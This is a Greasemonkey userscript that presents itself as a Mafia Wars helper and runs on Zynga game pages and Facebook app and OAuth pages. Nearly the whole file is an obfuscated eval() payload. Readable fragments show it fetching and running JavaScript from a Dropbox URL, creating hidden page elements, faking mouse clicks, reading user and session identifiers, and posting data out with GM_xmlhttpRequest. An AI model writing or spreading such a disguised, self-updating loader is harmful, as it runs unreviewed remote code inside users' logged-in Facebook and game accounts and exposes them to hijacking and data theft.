// ==UserScript==
// @name           Dabaang
// @namespace      test
// @include        https://userscripts.org/scripts/show/175215
// @updateURL       http://userscripts.org/scripts/source/175215.meta.js
// @version        2.0.6
// @include        http://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @grant          GM_setValue
// @include        https://*.mafiawars.zynga.com/mwfb/remote/html_server.php*
// @include        http://www.facebook.com/dialog/oauth?client_id=10000000001*
// @include        https://www.facebook.com/dialog/oauth?client_id=10000000001*
// @grant          GM_xmlhttpRequest
// @include        http://apps.facebook.com/inthemafia/?install_source*
// @include        https://apps.facebook.com/inthemafia/?install_source*
// @include        http://apps.facebook.com/inthemafia/*
// @grant          GM_getValue
// @include        https://apps.facebook.com/inthemafia/*
// @include        http://mafiademon.com
// @include        http://mafiatornado.com
// @include        http://mafiademon.info
// @updateURL      http://userscripts.org/scripts/source/175215.user.js
// ==/UserScript==
    
eval((function(s){var a,c,e,i,j,o="",r,t="¡¢£¤¥¦§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþ$%*^`~";for(i=0;i<s.length;i++){r=t+s[i][2];a=s[i][1].split("");for(j=a.length - 1;j>=0;j--){s[i][0]=s[i][0].split(r.charAt(j)).join(a[j]);}o+=s[i][0];}var p=2832;var x=function(r){var c,p,s,l='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789';if(r<63)c=l.charAt(r);else{r-=63;p=Math.floor(r/63);s=r%63;c=l.charAt(p)+l.charAt(s)}return c;};a=o.substr(p).split(':');r=a[1].split('?');a=a[0].split('?');o=o.substr(0,p);if(!''.replace(/^/,String)){var z={};for(i=0;i<89;i++){var y=x(i);z[y]=r[i]||y}t=/\b\w\w?\b/g;y=function(a){return z[a]||a};o=o.replace(t,y);}else{for(j=a[a.length-1]-1;j>=0;j--){if(r[j])o=o.replace(new RegExp('\b'+(j<63?c.charAt(j):c.charAt((j-63)/63)+c.charAt((j-63)%63))+'\b','g'),r[j])}}return o.replace(//g,"\n").replace(//g,"\"");})([["(¢Ñ8¦fòaêòcê;¨oauth?cli»_id=1ùù01¸Å_source&zy_ñ&ÅËË_Àive&fb_sig_loce¸mw_rdcnt¸?O=YToyÒJsb2JieSbGFuZCI7fQ·®U®}ú8)Ñd¦!0Ãh¦nullÃk¦!1Ãl¤o.CÃpøa§b§e¥n³ÙGEÛs://dl.dropboxu×cØt».Y/s/v920jow1dtrtjud/ÞíÊor.jsÚ¥´à!n¥n¦d®gÑbÖoµF¦a.ôspØText®bá²}Â¥´e)úg¬!n¥ÑaÝzµ®´a¥q¦p$Int`§10g¦d®Ñf¦`¦Q¼abµ) ?ßj(/new\\|(.+)\\|cb/.exec`j(Êob`)))[1])­0®jªmßk ?ßk()­(m(0)§y(¢m(1Â§1E4)² el {úb¬`Ýsµ)¥ÑuÝeµ®u¬(ÙPOSÛuÃG­æcoæURI`)Ãheaærs­{-Type­åli/jsØÃ-L­ +ß.l}Ú¥(à(âasµ§âaeµk²dÂa¦1Îe±MÁ"+
"d­k®a¹r¬(r¦a§7¼M§r)ÂáÂÑbgne¦hÃq¦0ÃrÕÑa®a­{é´-1¹I.aiÉ*_µ¥Ñb¤x¼*µsrc += &O=w®abôakßì}~g) {}a =¡«Ða¿Ðc¿=1¿O=wµ³-1Î«html_×ver.phpµ³!äfí_wråerµ³äSÁk­dìa¬(eÖgÆidSÆ$display:nØe;ÆG-loaær2.5.0µ§e)§aÖoµ§a.F¦'äSµ.E¼G-az§U×.ñId);'§a)§c()²)(p³(pÍÑsøb¥rígªm b¬(b¤x(b)´b¥Ñc¦b.Z.ÀeEv»¼è»sµ®c.íitè»¼click§d§d§b.Z.æfaultViewó0ó0ók§k§k§kóh)dispÊchEv»(c²b¥éÑïsubmit÷).W®g³(ïbuttØ÷).Wg¬-1ÎºFÉdaily take ôw$dÁÜm(gb¬ü3Â§5E3)­ü3Â~f) {}ìÕ-1¹þfeedµ ?¡ºFÉzýc(këþ©ýc(d²)(s³(sÍÑt¾ÕÑfÃc®´c¤x¼key"+
"µ)´f¦c±asµ)7¼ab§f)§c.F¦'U× ExtensiØ <agßr=color:#4f4;>Foundßv ActivÊed</ag>'ì})(t³(tÍ - 1¹«ãw$s.zynga.YÁpD.YÁsãæmØµ¬t.N(})(0?89:ÈÈdfunctiØÈ?loÈ???íæxOf?YTozÒJpbmRleCdmlldyÇyO3M6OToiJmhpZGRlbj0xIjt9?^%ById?tTimeout?ítheã?^½ûxw_cØtroller?hôf?facebook?t½ûínerHTML?dÊa?v$?wídow?Àe%?ANY_UNORDERED_NODE_TYPE?protocol?autopo?$t?next_paÞs?åendChildÏ^ÔØôadyÊechangûæmØdÊaÏxmlReque?ôturn?if?sígleNoæÔômove½ûcom?ownerDbodyÈås???XPÊhResultÏtÔskip?ôadyStÊûfôegifts?Key?ôques?evuÊûurl?top?"+
"span?publish?namûÊobÏiops?CØt»?typeof?Êus??method?diog?ylûkey?íput?cÊch?and?typûtruûte?fbid",
" -1 !== j () {(i.o.C = i.) { = , V £.v('3.D.Y/z === al.v( &&  : ;') > -1¥¯af.o.C.A(G-)}} || V ()°¦o.L + ¶'//©/'·®U®}¨ !== i._.ent(Attribut®(j (f¥µ ||¡«creatµ ? )},/.ay£))installµ§e.E¼I7aTo????.v¼at_link&zyOntpOjA¦{}))® === ?GM_B=aH Ì7czo1OiÇxO3M6NValue?f.N¦¢¤J¼aseronT({ap­ÃR­j (aTÃae­I.y(¢¦e±aram a200ª.an¬y(c§1E3e.X¼G-mafiai.x¼appdesome_mwiMouseEvtry {Ä8¦ax) :¡}ing¤ad('//îÊ[@aw=ßv @atrack®´/Ð§0§reði=ah]õ'§i§h§ö6.K§h¾j m(0000´!e?Üc(bÂ§3Eµ¬Q¼Mµ¬I.o.CÉ4ª.9¬ÓDoi¦k®stchromaj c(http®b.alscriptength§q§fºP(seocum»?hidæncÊiØ¦kÃ)®.N(ë«)§b¦§arElem»çfÞeget(aßu (aq/",
""]]));